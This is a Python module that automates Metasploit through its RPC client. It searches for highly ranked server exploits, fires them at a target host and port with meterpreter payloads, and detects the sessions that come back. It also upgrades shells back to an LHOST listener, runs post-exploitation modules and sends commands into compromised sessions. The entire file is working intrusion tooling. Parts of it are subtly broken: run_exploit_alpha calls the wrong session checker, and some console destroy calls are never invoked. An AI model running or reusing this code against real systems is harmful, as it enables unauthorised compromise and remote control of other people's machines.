#!/usr/bin/env python3
import os
import time
import re
import sys
PATH = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(PATH)
import utils
from utils import PPrint
import config


def try_upgrade_shell(session):
    client = config.getClient()
    try:
        upgrade_shell = client.sessions.session(session).upgrade(lhost=os.environ.get("LHOST"), lport=utils.generate_random_port())
        if upgrade_shell == "":
            upgrade_shell = True
    except Exception:
        upgrade_shell = False
    if upgrade_shell:
        return True
    else:
        return False


def execute_command_on_meterpreter(session_id, command):
    client = config.getClient()
    cid = client.consoles.console().cid
    cmd = 'sessions -i {session_id} -c \"{command}\" \n\n'.format(session_id=session_id, command=command)
    client.consoles.console(cid).write(cmd)
    client.consoles.console(cid).destroy()


def execute_load_stdapi_on_meterpreter_session(session_id):
    client = config.getClient()
    cid = client.consoles.console().cid
    cmd = "sessions -i {session_id} -C 'load stdapi' \n\n".format(session_id=session_id)
    client.consoles.console(cid).write(cmd)
    client.consoles.console(cid).destroy()


def execute_meterpreter_post_module(session_id, module_name):
    client = config.getClient()
    cid = client.consoles.console().cid
    # cmd = 'sessions -i {session_id} -c \"{module_name}\" \n\n'.format(session_id=session_id, module_name=module_name)
    # The response of on-the-fly running of Post exploitation module seems to be buggy/unstable.
    # Runnning the module directly is more reliable.
    cmd = 'use {module_name} \n\n'.format(module_name=module_name)
    cmd += 'set SESSION {session_id} \n\n'.format(session_id=session_id)
    cmd += 'run \n\n'
    client.consoles.console(cid).write(cmd)
    time.sleep(5)
    resp = client.consoles.console(cid).read()["data"]
    client.consoles.console(cid).destroy()
    return resp


def execute_command_on_shell(session_id, command):
    client = config.getClient()
    client.sessions.session(str(session_id)).write(command + " \n\n")


def search_for_exploits(search_term, product=True):
    if search_term == "":
        return([])
    client = config.getClient()
    output = []

    if product:
        query = "search name:{product_name} type:exploit app:server".format(product_name=search_term)
    else:
        query = "search {product_name} type:exploit app:server".format(product_name=search_term)

    if query in config.CACHED_SEARCH_RESULTS.keys():
        # Using cached results during runtime
        return config.CACHED_SEARCH_RESULTS[query]

    cid = client.consoles.console().cid
    client.consoles.console(cid).write(query)
    max_attempts = 3
    attempts = 0
    while client.consoles.console(cid).is_busy():
        time.sleep(1)
        attempts += 1
        if attempts >= max_attempts:
            PPrint().error("Search timeout on [{}]".format(search_term))
            client.consoles.console(cid).destroy
            return([])
    resp = client.consoles.console(cid).read()
    exploits_output = re.findall("exploit/.*", resp["data"])
    for exploit_data in exploits_output:
        exploit_details = re.split('\\s+', exploit_data)
        exploit_name = exploit_details[0]
        exploit_name = exploit_name[8:]
        if not utils.check_if_exploit_is_in_exploits_tree(exploit_name):
            continue
        if len(exploit_details) < 3:
            continue
        rank = exploit_details[2]
        if rank not in ["excellent", "great", "good"]:
            continue
        output.append(exploit_name)

    client.consoles.console(cid).destroy
    # Caching results
    config.CACHED_SEARCH_RESULTS[query] = output
    return(output)


def get_meterpreter_session_id(rhost):
    output = {"session_id": None}
    client = config.getClient()
    try:
        sessions = client.sessions.list
    except AttributeError:
        return output
    for session_id in sessions.keys():
        session = sessions[str(session_id)]
        try:
            if session["session_host"] == rhost and session["type"] == "meterpreter":
                output["session_id"] = session_id
                return output
        except TypeError:
            pass
    return output


def check_if_exploit_executed_successfully_and_returned_shell(job_uuid):
    client = config.getClient()
    output = {"result": False,
              "port_number": 0,
              "exploit_name": None,
              "type": None,
              "payload": None,
              "session_id": None}
    if job_uuid is None:
        return output
    try:
        sessions = client.sessions.list
    except AttributeError:
        return output
    for session_id in sessions.keys():
        session = sessions[str(session_id)]
        try:
            if session["exploit_uuid"] == job_uuid:
                output["result"] = True
                output["port_number"] = session["session_port"]
                output["exploit_name"] = session["via_exploit"]
                output["type"] = session["type"]
                output["payload"] = session["via_payload"]
                output["session_id"] = str(session_id)
                output["session_host"] = session["session_host"]
                break
        except TypeError:
            pass

    return output


def run_exploit(rhost, exploit_name, port, attempt_to_upgrade_shell=False, close_session_after_detection=True):

    PPrint().testing_exploit("Testing {exploit_name} on {target}:{port}".format(exploit_name=exploit_name,
                                                                                target=rhost,
                                                                                port=port,))

    client = config.getClient()
    exploit = client.modules.use('exploit', exploit_name)
    exploit_options = exploit.options
    if "RHOSTS" in exploit_options:
        exploit["RHOSTS"] = rhost
    if "RHOST" in exploit_options:
        exploit["RHOST"] = rhost
    exploit["RPORT"] = port
    payload = None
    for target_payload in exploit.targetpayloads():
        if "meterpreter" in target_payload:
            payload = target_payload
            break
    if not payload:
        payload = exploit.targetpayloads()[0]

    try:
        query = exploit.execute(payload=payload)
        time.sleep(config.TTL_FOR_EXPLOIT_VALIDATION)
        result = check_if_exploit_executed_successfully_and_returned_shell(query["uuid"])
    except ValueError:
        result = check_if_exploit_executed_successfully_and_returned_shell("invalid")
        pass

    if result["type"] == "meterpreter":
        result["meterpreter_session_id"] = result["session_id"]
    else:
        result["meterpreter_session_id"] = None

    if result["result"] and close_session_after_detection:
        try:
            client.sessions.session(result["session_id"]).stop()
        except Exception:
            pass
    if result["result"] and attempt_to_upgrade_shell:
        upgrade_shell = try_upgrade_shell(result["session_id"])
        result["upgrade_shell"] = upgrade_shell
        if upgrade_shell:
            result["meterpreter_session_id"] = get_meterpreter_session_id(result["session_host"])["session_id"]
    else:
        result["upgrade_shell"] = False
    return result


def check_if_exploit_executed_successfully_and_returned_shell_alpha(exploit):
    client = config.getClient()
    output = {"result": False,
              "port_number": 0,
              "exploit_name": None,
              "type": None,
              "payload": None,
              "session_id": None}
    if exploit is None:
        return output
    try:
        sessions = client.sessions.list
    except AttributeError:
        return output
    for session_id in sessions.keys():
        session = sessions[str(session_id)]
        try:
            if session["via_exploit"] == "exploit/{}".format(exploit):
                output["result"] = True
                output["port_number"] = session["session_port"]
                output["exploit_name"] = session["via_exploit"]
                output["type"] = session["type"]
                output["payload"] = session["via_payload"]
                output["session_id"] = str(session_id)
                output["session_host"] = session["session_host"]
                break
        except TypeError:
            pass

    return output


def run_exploit_alpha(rhost, exploit_name, port, attempt_to_upgrade_shell=False, close_session_after_detection=True, cid=None):
    PPrint().testing_exploit("Testing {exploit_name} on {target}:{port}".format(exploit_name=exploit_name,
                                                                                target=rhost,
                                                                                port=port,))

    cmd = "use exploit/{exploit_name}\n\nset RPORT {port}\n\nset RHOSTS {rhost}\n\nexploit -j".format(exploit_name=exploit_name, port=port, rhost=rhost)
    try:
        client = config.getClient()
        client.consoles.console(cid).write(cmd)
        time.sleep(config.TTL_FOR_EXPLOIT_VALIDATION)
        result = check_if_exploit_executed_successfully_and_returned_shell(exploit_name)
    except ValueError:
        result = check_if_exploit_executed_successfully_and_returned_shell(None)
        pass
    except KeyError:
        result = check_if_exploit_executed_successfully_and_returned_shell(None)
        pass
    if result["type"] == "meterpreter":
        result["meterpreter_session_id"] = result["session_id"]
    else:
        result["meterpreter_session_id"] = None

    if result["result"] and close_session_after_detection:
        try:
            client.sessions.session(result["session_id"]).stop()
        except Exception:
            pass
    if result["result"] and attempt_to_upgrade_shell:
        upgrade_shell = try_upgrade_shell(result["session_id"])
        result["upgrade_shell"] = upgrade_shell
        if upgrade_shell:
            result["meterpreter_session_id"] = get_meterpreter_session_id(result["session_host"])["session_id"]
    else:
        result["upgrade_shell"] = False
    return result
